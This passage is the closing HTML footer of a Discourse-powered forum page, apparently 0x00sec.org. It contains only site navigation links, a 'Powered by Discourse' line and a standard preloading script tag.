<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
